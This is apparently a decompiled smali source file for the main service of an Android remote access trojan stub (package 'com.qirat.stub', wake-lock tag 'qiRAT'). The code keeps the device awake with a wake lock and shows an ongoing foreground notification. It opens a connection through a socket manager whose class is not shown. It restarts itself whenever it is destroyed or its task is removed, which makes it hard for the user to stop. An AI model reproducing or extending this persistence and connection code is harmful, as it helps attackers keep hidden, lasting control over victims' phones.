.class public Lcom/qirat/stub/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# static fields
.field private static final NOTIFICATION_CHANNEL_ID:Ljava/lang/String; = "MainServiceChannel"

.field private static final NOTIFICATION_ID:I = 0x1

.field private static final TAG:Ljava/lang/String; = "MainService"


# instance fields
.field private socketManager:Lcom/qirat/stub/Socket;

.field private wakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 14
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private createNotification()Landroid/app/Notification;
    .locals 2

    .line 126
    new-instance v0, Landroidx/core/app/NotificationCompat$Builder;

    const-string v1, "MainServiceChannel"

    invoke-direct {v0, p0, v1}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    sget v1, Lcom/qirat/stub/R$string;->app_name:I

    .line 127
    invoke-virtual {p0, v1}, Lcom/qirat/stub/MainService;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    sget v1, Lcom/qirat/stub/R$string;->service_notification:I

    .line 128
    invoke-virtual {p0, v1}, Lcom/qirat/stub/MainService;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    sget v1, Lcom/qirat/stub/R$mipmap;->ic_launcher:I

    .line 129
    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 130
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 131
    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 132
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setAutoCancel(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 133
    invoke-virtual {v0}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    .line 126
    return-object v0
.end method

.method private createNotificationChannel()V
    .locals 4

    .line 108
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 109
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "Main Service Channel"

    const/4 v2, 0x4

    const-string v3, "MainServiceChannel"

    invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 114
    .local v0, "serviceChannel":Landroid/app/NotificationChannel;
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    .line 115
    const/4 v1, 0x0

    invoke-virtual {v0, v1, v1}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    .line 117
    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Lcom/qirat/stub/MainService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    .line 118
    .local v1, "manager":Landroid/app/NotificationManager;
    if-eqz v1, :cond_0

    .line 119
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 122
    .end local v0    # "serviceChannel":Landroid/app/NotificationChannel;
    .end local v1    # "manager":Landroid/app/NotificationManager;
    :cond_0
    return-void
.end method

.method private restartService()V
    .locals 3

    .line 99
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/qirat/stub/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/qirat/stub/MainService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 100
    .local v0, "restartIntent":Landroid/content/Intent;
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_0

    .line 101
    invoke-virtual {p0, v0}, Lcom/qirat/stub/MainService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 103
    :cond_0
    invoke-virtual {p0, v0}, Lcom/qirat/stub/MainService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 105
    :goto_0
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .line 25
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 3

    .line 30
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 31
    invoke-direct {p0}, Lcom/qirat/stub/MainService;->createNotificationChannel()V

    .line 32
    invoke-static {p0}, Lcom/qirat/stub/Socket;->getInstance(Landroid/content/Context;)Lcom/qirat/stub/Socket;

    move-result-object v0

    iput-object v0, p0, Lcom/qirat/stub/MainService;->socketManager:Lcom/qirat/stub/Socket;

    .line 35
    const-string v0, "power"

    invoke-virtual {p0, v0}, Lcom/qirat/stub/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    .line 36
    .local v0, "powerManager":Landroid/os/PowerManager;
    if-eqz v0, :cond_0

    .line 37
    const/4 v1, 0x1

    const-string v2, "qiRAT::ServiceWakeLock"

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v1

    iput-object v1, p0, Lcom/qirat/stub/MainService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    .line 38
    iget-object v1, p0, Lcom/qirat/stub/MainService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 39
    const-string v1, "MainService"

    const-string v2, "WakeLock acquired"

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 41
    :cond_0
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .line 73
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 74
    const-string v0, "Service destroying..."

    const-string v1, "MainService"

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 76
    iget-object v0, p0, Lcom/qirat/stub/MainService;->socketManager:Lcom/qirat/stub/Socket;

    if-eqz v0, :cond_0

    .line 77
    iget-object v0, p0, Lcom/qirat/stub/MainService;->socketManager:Lcom/qirat/stub/Socket;

    invoke-virtual {v0}, Lcom/qirat/stub/Socket;->disconnect()V

    .line 80
    :cond_0
    iget-object v0, p0, Lcom/qirat/stub/MainService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/qirat/stub/MainService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 81
    iget-object v0, p0, Lcom/qirat/stub/MainService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 82
    const-string v0, "WakeLock released"

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 85
    :cond_1
    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Lcom/qirat/stub/MainService;->stopForeground(Z)V

    .line 88
    invoke-direct {p0}, Lcom/qirat/stub/MainService;->restartService()V

    .line 89
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 5
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .line 45
    const-string v0, "Service starting..."

    const-string v1, "MainService"

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 48
    invoke-direct {p0}, Lcom/qirat/stub/MainService;->createNotification()Landroid/app/Notification;

    move-result-object v0

    .line 50
    .local v0, "notification":Landroid/app/Notification;
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x22

    const/4 v4, 0x1

    if-lt v2, v3, :cond_0

    .line 51
    const v2, 0x40000040    # 2.0000153f

    invoke-virtual {p0, v4, v0, v2}, Lcom/qirat/stub/MainService;->startForeground(ILandroid/app/Notification;I)V

    goto :goto_0

    .line 55
    :cond_0
    invoke-virtual {p0, v4, v0}, Lcom/qirat/stub/MainService;->startForeground(ILandroid/app/Notification;)V

    .line 58
    :goto_0
    iget-object v2, p0, Lcom/qirat/stub/MainService;->socketManager:Lcom/qirat/stub/Socket;

    if-nez v2, :cond_1

    .line 59
    const-string v2, "Socket not initialized, stopping service."

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 60
    invoke-virtual {p0}, Lcom/qirat/stub/MainService;->stopSelf()V

    .line 61
    const/4 v1, 0x2

    return v1

    .line 65
    :cond_1
    iget-object v1, p0, Lcom/qirat/stub/MainService;->socketManager:Lcom/qirat/stub/Socket;

    invoke-virtual {v1}, Lcom/qirat/stub/Socket;->connect()V

    .line 68
    return v4
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 2
    .param p1, "rootIntent"    # Landroid/content/Intent;

    .line 93
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    .line 94
    const-string v0, "MainService"

    const-string v1, "Task removed, restarting service..."

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 95
    invoke-direct {p0}, Lcom/qirat/stub/MainService;->restartService()V

    .line 96
    return-void
.end method
